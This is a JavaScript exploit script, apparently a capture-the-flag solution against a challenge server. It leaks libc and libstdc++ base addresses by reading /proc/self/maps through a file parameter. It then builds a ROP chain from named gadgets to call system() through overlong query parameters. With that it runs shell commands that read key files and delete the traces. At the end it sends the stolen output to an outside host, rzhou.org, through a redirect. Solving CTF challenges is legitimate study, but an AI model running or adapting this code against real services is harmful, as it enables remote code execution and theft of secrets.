function request(url) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', url, false);
    xhr.send(null);
    return xhr.responseText;
}

function rep(x, n) {
    return Array(n + 1).join(x);
}

function ljust(s, x, n) {
    return (s + rep(x, n)).slice(0, n)
}

function rjust(s, x, n) {
    return (rep(x, n) + s).slice(-n)
}

function pack(d) {
    var result = '';
    for (var i = 0; i < 8; ++i) {
        result += '%' + rjust((d & 0xff).toString(16), '0', 2);
        d /= 256;
    }
    return result;
}

var url = 'http://bigson.essolutions.largestctf.com'
var proc_maps = request(url + '/index?file=/proc/self/maps');
var lines = proc_maps.split('\n');
var libc_base = null;
var libcpp_base = null;
for (var i in lines) {
    if (libc_base == null && lines[i].indexOf('libc') != -1) {
        libc_base = parseInt(lines[i].split('-')[0], 16);
    }
    if (libcpp_base == null && lines[i].indexOf('libstdc++') != -1) {
        libcpp_base = parseInt(lines[i].split('-')[0], 16);
    }
}

prompt();

var system = libc_base + 0x3ff80

/*
b6a22:       49 89 f4                mov    %rsi,%r12
b6a25:       48 89 d5                mov    %rdx,%rbp
b6a28:       ff 50 30                callq  *0x30(%rax)
*/
var gadget1 = libcpp_base + 0xb6a22

/*
7b2b7:       4c 89 e7                mov    %r12,%rdi
7b2ba:       ff 50 60                callq  *0x60(%rax)
*/
var gadget2 = libcpp_base + 0x7b2b7

function encode(s) {
    var result = '';
    for (var i in s) {
        if (s[i] == ' ' || s[i] == '\n' || s[i] == '&' || s[i] == '#') {
            result += '%' + rjust(s.charCodeAt(i).toString(16), '0', 2);
        } else {
            result += s[i];
        }
    }
    return result;
}

function exploit(command) {
    command = ljust(command, 'A', 0x30);
    command += pack(gadget2);
    command += rep('A', 0x28);
    command += pack(system);

    var key1 = rep('B', 257);
    var value1 = rep('C', 0x18) + pack(gadget1);
    var key2 = ljust(encode(command), 'X', 256);
    var value2 = "E"

    var target_url = url + '/index?' + key1 + '=' + value1 + '&' + key2 + '=' + value2;
    try {
        var response = request(target_url);
    } catch (e) {
        return null;
    }

    return response;
}

exploit("(id;cat *key*)>/tmp/@;#");
var x = request(url + '/index?file=/tmp/@');
exploit("rm /tmp/@;#");
window.location = 'https://rzhou.org/?ctf=' + escape(x);
